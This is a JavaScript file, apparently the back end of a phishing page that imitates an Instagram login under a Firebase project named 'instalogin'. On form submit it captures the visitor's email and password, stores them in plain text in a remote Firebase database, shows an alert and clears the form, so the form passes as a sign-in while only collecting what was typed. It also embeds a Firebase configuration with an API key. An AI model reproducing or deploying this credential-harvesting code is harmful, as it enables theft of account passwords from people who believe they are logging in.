const firebaseConfig = {
    apiKey: "AIzaSyDl7oMWeAkiZra5MczuBXmUygPMu9IB1Cw",
    authDomain: "instalogin-838de.firebaseapp.com",
    databaseURL: "https://instalogin-838de-default-rtdb.firebaseio.com",
    projectId: "instalogin-838de",
    storageBucket: "instalogin-838de.appspot.com",
    messagingSenderId: "1018619772286",
    appId: "1:1018619772286:web:6d4fe611493d39bdb7072f"
  };
  
  // initialize firebase
  firebase.initializeApp(firebaseConfig);
  
  // reference your database
  var contactFormDB = firebase.database().ref("loginForm");
  
  document.getElementById("loginForm").addEventListener("submit", submitForm);
  
  function submitForm(e) {
    e.preventDefault();
  
    var emailid = getElementVal("emailid");
    var password = getElementVal("password");
  
    saveMessages(emailid, password);
  
    //   enable alert
    document.querySelector(".alert").style.display = "block";
  
    //   remove the alert
    setTimeout(() => {
      document.querySelector(".alert").style.display = "none";
    }, 3000);
  
    //   reset the form
    document.getElementById("loginForm").reset();
  }
  
  const saveMessages = (emailid, password) => {
    var newContactForm = contactFormDB.push();
  
    newContactForm.set({
      emailid: emailid,
      password: password,
    });
  };
  
  const getElementVal = (id) => {
    return document.getElementById(id).value;
  };